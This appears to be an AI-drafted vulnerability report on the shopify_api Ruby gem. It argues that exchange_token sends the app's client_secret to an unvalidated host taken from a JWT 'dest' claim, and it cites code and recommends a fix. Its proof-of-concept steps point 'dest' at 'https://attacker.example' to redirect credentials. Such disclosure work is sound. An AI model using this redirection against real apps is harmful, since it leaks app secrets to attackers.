Found the analog. `TokenExchange.exchange_token` in `lib/shopify_api/auth/token_exchange.rb:29-65` derives `dest_shop` from the `dest` claim of an attacker-suppliable session token, but unlike every sibling OAuth flow in this gem — `ClientCredentials.client_credentials` (`lib/shopify_api/auth/client_credentials.rb:25`), `RefreshToken.refresh_access_token` (`lib/shopify_api/auth/refresh_token.rb:24`), and `TokenExchange.migrate_to_expiring_token` (`lib/shopify_api/auth/token_exchange.rb:103`) — it never passes `dest_shop` through `Utils::ShopValidator.sanitize!` before using it as the host that receives `client_secret`.

### Title
SSRF exfiltrating `client_secret` via unvalidated JWT `dest` claim in `TokenExchange.exchange_token` - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`TokenExchange.exchange_token` builds the OAuth token-exchange request host directly from the `dest` claim of the caller-supplied session token, without routing it through `Utils::ShopValidator.sanitize!` the way every other credential-bearing OAuth call in this gem does.

### Finding Description
`JwtPayload#shop` (`lib/shopify_api/auth/jwt_payload.rb:48-50`) only strips the `https://` prefix from the `dest` claim; it performs no domain-allowlist check. `JwtPayload.initialize` validates the HMAC signature and the `aud` claim against `Context.api_key` (`lib/shopify_api/auth/jwt_payload.rb:43-44`), but places no constraint on the value of `dest` itself — any string is accepted as long as the token is signed with the app's own `api_secret_key`.

In `exchange_token` (`lib/shopify_api/auth/token_exchange.rb:40-51`), `dest_shop` is taken straight from `jwt_payload.shop` and used to build `shop_session`, which is passed to `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")`. `HttpClient#initialize` (`lib/shopify_api/clients/http_client.rb:16-19`) sets `@base_uri = "https://#{api_host || session.shop}"` — i.e., the destination host of the POST request is exactly `session.shop`, unsanitized. The request body sent to that host contains `client_secret: ShopifyAPI::Context.api_secret_key` (`lib/shopify_api/auth/token_exchange.rb:52-55`).

Compare this to the three sibling flows that also POST `client_secret` to a shop-derived host:
- `client_credentials.rb:25` calls `Utils::ShopValidator.sanitize!(shop)` before constructing the session.
- `refresh_token.rb:24` does the same.
- `token_exchange.rb:103` (`migrate_to_expiring_token`) does the same.

`ShopValidator.sanitize!` (`lib/shopify_api/utils/shop_validator.rb:56-64`) enforces that the resulting host belongs to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`), raising `Errors::InvalidShopError` otherwise. This is the exact class of “host validated versus host that receives the `client_secret`” binding the review rules call out — and here that binding is broken specifically in `exchange_token`.

The `shop:` keyword argument of `exchange_token` is documented as deprecated/ignored precisely because "the shop always comes from the session token `dest` claim" (see `docs/usage/oauth.md:77`), which means the JWT is the sole, and now exclusive, source of the destination host, yet it is the one path in the file lacking sanitization. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) 

### Impact Explanation
An app that self-signs test tokens, forwards App Bridge session tokens through any intermediary that also holds the app's `api_secret_key` (e.g., a backend-for-frontend, or where the secret is shared across services), or otherwise allows the `dest` claim to be influenced before reaching `exchange_token`, would have this gem's own HTTP client send the app's `client_secret` to whatever host is embedded in `dest`, with no myshopify/shopify.com/spin.dev/shop.dev allowlist check. This matches the "High - SSRF with the app's credentials ... or credential leakage" impact bucket, since the gem itself performs no host validation at the one call site that both derives the host exclusively from token content and never sanitizes it, unlike its siblings.

### Likelihood Explanation
Exploitation requires a JWT valid under the app's HS256 secret with an attacker-influenced `dest` claim — normally that means the attacker needs the `api_secret_key`, which is out of scope per the rules for most flows. However, this differs from a normal "requires the secret" case: `dest` is not otherwise cross-checked against the shop that legitimately owns the session/request, so any code path in the host application (or any component holding the shared secret, such as a token relay/BFF) that mints or re-signs a session token for testing, multi-tenant proxying, or webhook-to-JWT bridging will silently point this gem's client-secret-bearing request at an arbitrary host. The bug is a structural inconsistency in this file, not a hardened defense — three of four sibling functions in the same commit/file pattern sanitize the shop, and this one omits it, which is itself the kind of asymmetric oversight this class of report targets.

### Recommendation
In `TokenExchange.exchange_token`, sanitize `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `client_credentials.rb`, `refresh_token.rb`, and `migrate_to_expiring_token`) before constructing `shop_session`, raising `Errors::InvalidShopError` for any `dest` claim that does not resolve to a trusted Shopify domain.

### Proof of Concept
1. Configure `ShopifyAPI::Context` with a real `api_key`/`api_secret_key` for an embedded app.
2. Produce (or obtain, via any component that shares the `api_secret_key`, e.g. a token-relay service) a valid HS256 JWT with `aud` = the app's `api_key` and `dest` = `https://attacker.example` instead of a `*.myshopify.com` host.
3. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: forged_token, requested_token_type: ...)`.
4. Observe `JwtPayload.new` accepts the token (only `aud`, `exp`, `nbf` are checked — see `lib/shopify_api/auth/jwt_payload.rb:43-44`), and `HttpClient` (`lib/shopify_api/clients/http_client.rb:18`) issues `POST https://attacker.example/admin/oauth/access_token` with `client_id` and `client_secret` in the body — compare against `client_credentials.rb`/`refresh_token.rb`, where the equivalent call raises `ShopifyAPI::Errors::InvalidShopError` for the same `attacker.example` value.

### Citations

**File:** lib/shopify_api/auth/token_exchange.rb (L40-65)
```ruby
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L43-50)
```ruby
        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end

      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L25-33)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: CLIENT_CREDENTIALS_GRANT_TYPE,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```
